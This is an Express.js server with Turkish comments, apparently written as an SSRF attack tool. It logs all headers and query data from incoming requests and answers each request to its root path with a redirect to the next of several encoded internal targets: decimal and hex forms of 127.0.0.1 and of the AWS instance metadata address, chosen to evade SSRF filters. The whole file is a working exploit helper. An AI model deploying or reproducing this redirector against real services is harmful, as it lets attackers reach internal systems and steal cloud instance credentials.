const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Denenecek bypass hedeflerinin listesi (Sırayla dönecek)
const bypassTargets = [
    'http://2130706433',                  // Decimal (127.0.0.1)
    'http://0x7f000001',                // Hexadecimal (127.0.0.1)
    'http://127.1',                     // Short IP
    'http://2852039166/latest/meta-data/', // AWS Metadata Decimal
    'http://0xa9fea9fe/latest/meta-data/'  // AWS Metadata Hex
];

let currentIndex = 0;

// Detaylı Loglama Middleware'i (Gelen her bilgiyi yakalar)
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    
    console.log('\n========================================');
    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI!`);
    console.log('========================================');
    console.log(`Method    : ${req.method}`);
    console.log(`URL       : ${req.url}`);
    console.log(`IP        : ${req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress}`);
    console.log(`User-Agent: ${req.headers['user-agent'] || 'Bilinmiyor'}`);
    console.log(`Host      : ${req.headers['host'] || 'Bilinmiyor'}`);
    
    console.log('--- TÜM HEADERS ---');
    console.log(JSON.stringify(req.headers, null, 2));
    
    console.log('--- QUERY PARAMETRELERİ ---');
    console.log(JSON.stringify(req.query, null, 2));
    console.log('----------------------------------------\n');
    
    next();
});

// Ana Domain: Her istekte bir sonraki bypass hedefine yönlendirir
app.get('/', (req, res) => {
    const internalTarget = bypassTargets[currentIndex];
    
    console.log(`[!] Sıradaki Hedef Seçildi (#${currentIndex + 1}) ➔ Yönlendiriliyor: ${internalTarget}`);
    
    // Listede bir sonraki hedefe geç, sonuncudaysa başa dön
    currentIndex = (currentIndex + 1) % bypassTargets.length;
    
    // 302 Redirect ile fırlat
    return res.redirect(302, internalTarget);
});

app.listen(3000, () => {
    console.log("🚀 Döngülü Bypass + Detaylı Log Avcısı 3000 portunda devrede!");
});
